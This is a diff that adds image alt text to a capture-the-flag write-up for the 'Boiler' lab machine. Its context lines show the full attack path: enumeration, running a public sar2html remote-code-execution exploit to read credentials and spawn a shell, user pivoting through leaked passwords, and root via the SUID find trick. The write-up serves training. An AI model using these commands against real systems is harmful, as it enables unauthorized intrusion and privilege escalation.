@@ -35,9 +35,9 @@ nmap -A -p- TARGET -oN boiler.nmap --min-rate 10000
 | 10000    | http        |
 | 55007    | ssh         |
 
-![](https://cdn.ziomsec.com/boilerctf/1.webp)
+![performing an nmap scan on boiler-CTF machine](https://cdn.ziomsec.com/boilerctf/1.webp)
 
-![](https://cdn.ziomsec.com/boilerctf/2.webp)
+![performing an nmap scan on boiler-CTF machine](https://cdn.ziomsec.com/boilerctf/2.webp)
 
 ## Initial Foothold
 
@@ -49,11 +49,11 @@ Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
 
 I accessed the web application on port 80 and found Apache's default landing page. Port 10000 had a login panel.
 
-![](https://cdn.ziomsec.com/boilerctf/3.webp)
+![accessing the login panel](https://cdn.ziomsec.com/boilerctf/3.webp)
 
 I then viewed *robots.txt* on port 80 and found multiple endpoints.
 
-![](https://cdn.ziomsec.com/boilerctf/4.webp)
+![accessing the robots.txt file](https://cdn.ziomsec.com/boilerctf/4.webp)
 
 I also ran a directory bruteforce scan using **ffuf** to find more directories.
 
@@ -61,11 +61,11 @@ I also ran a directory bruteforce scan using **ffuf** to find more directories.
 ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/5.webp)
+![perfomring directory bruteforce using ffuf](https://cdn.ziomsec.com/boilerctf/5.webp)
 
 The **JOOMLA** endpoint seemed interesting so I accessed it.
 
-![](https://cdn.ziomsec.com/boilerctf/6.webp)
+![accessing JOOMLA endpoint](https://cdn.ziomsec.com/boilerctf/6.webp)
 
 I brute forced files present in the **joomla** directory.
 
@@ -73,15 +73,15 @@ I brute forced files present in the **joomla** directory.
 ffuf -u http://TARGET/joomla/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,301
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/7.webp)
+![fuzzing the joomla endpoint](https://cdn.ziomsec.com/boilerctf/7.webp)
 
-![](https://cdn.ziomsec.com/boilerctf/8.webp)
+![fuzzing the joomla endpoint](https://cdn.ziomsec.com/boilerctf/8.webp)
 
 I found the version of a web based tool in the source code of `_test`.
 
-![](https://cdn.ziomsec.com/boilerctf/9.webp)
+![accessing discovered endpoint](https://cdn.ziomsec.com/boilerctf/9.webp)
 
-![](https://cdn.ziomsec.com/boilerctf/10.webp)
+![viewing version of the web based tool](https://cdn.ziomsec.com/boilerctf/10.webp)
 
 ### Shell as `www-data`
 
@@ -91,7 +91,7 @@ I searched for exploits and found an **RCE**.
 searchsploit 'sar2html'
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/11.webp)
+![searching for exploit](https://cdn.ziomsec.com/boilerctf/11.webp)
 
 I used the following exploit to execute os commands on the target and found the username and password of a user in the log file.
 - https://github.com/Jsmoreira02/sar2HTML_exploit
@@ -100,7 +100,7 @@ I used the following exploit to execute os commands on the target and found the 
 python3 sar2html_exploit.py http://TARGET/joomla/_test/index.php --command "cat log.txt"
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/12.webp)
+![running the RCE exploit](https://cdn.ziomsec.com/boilerctf/12.webp)
 
 This exploit also allowed us to spawn an interactive shell as **www-data**.
 
@@ -108,7 +108,7 @@ This exploit also allowed us to spawn an interactive shell as **www-data**.
 python3 sar2html_exploit.py http://TARGET/joomla/_test/index.php --shell_mode
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/13.webp)
+![spawning an interactive shell as `www-data`](https://cdn.ziomsec.com/boilerctf/13.webp)
 
 ### Shell as `basterd`
 
@@ -120,7 +120,7 @@ export TERM=xterm
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/14.webp)
+![spawning a shell as `basterd` user](https://cdn.ziomsec.com/boilerctf/14.webp)
 
 I analyzed the **backup.sh** script and found the credentials of another user.
 
@@ -129,9 +129,9 @@ ls -la
 cat backup.sh
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/15.webp)
+![inspecting shell script](https://cdn.ziomsec.com/boilerctf/15.webp)
 
-![](https://cdn.ziomsec.com/boilerctf/16.webp)
+![credentials for stoner user](https://cdn.ziomsec.com/boilerctf/16.webp)
 
 ### Shell as `stoner`
 
@@ -142,7 +142,7 @@ su stoner
 cat .secret
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/17.webp)
+![switching to stoner and capturing the first flag](https://cdn.ziomsec.com/boilerctf/17.webp)
 
 ## Privilege Escalation
 
@@ -152,7 +152,7 @@ I then looked for binaries with **suid** bit set and found the **find** command.
 find / -user root -perm -u=s -ls 2>/dev/null
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/18.webp)
+![listing binaries with SUID bit](https://cdn.ziomsec.com/boilerctf/18.webp)
 
 Since this was uncommon, I visited **gtfobins** and found a way to exploit this in order to get root access.
 - https://gtfobins.github.io/gtfobins/find/#suid
@@ -161,7 +161,7 @@ Since this was uncommon, I visited **gtfobins** and found a way to exploit this 
 find . -exec /bin/bash -p\; -quit
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/19.webp)
+![spawning a shell as root](https://cdn.ziomsec.com/boilerctf/19.webp)
 
 After getting root access, I captured the root flag from the */root* directory.
 
@@ -170,7 +170,7 @@ cd /root
 cat root.txt
 ```
 
-![](https://cdn.ziomsec.com/boilerctf/20.webp)
+![capturing the root flag](https://cdn.ziomsec.com/boilerctf/20.webp)
 
 That's it from my side :)
 Happy hacking!
